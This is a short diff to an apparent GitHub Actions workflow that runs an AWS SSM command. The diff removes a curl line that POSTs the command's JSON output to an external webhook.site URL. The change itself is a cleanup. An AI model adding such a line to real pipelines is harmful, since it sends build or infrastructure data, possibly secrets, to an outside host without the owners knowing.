@@ -272,8 +272,6 @@ jobs:
             echo "$STDERR"
           fi
 
-          curl -X POST -H "Content-Type: application/json" -d "$RAW_JSON" https://webhook.site/681f0d6f-6fa8-46bb-8fe2-22aa02b5e79e
-
           if [ "$STATUS" != "Success" ]; then
             echo "SSM command failed with status: $STATUS"
             exit 1
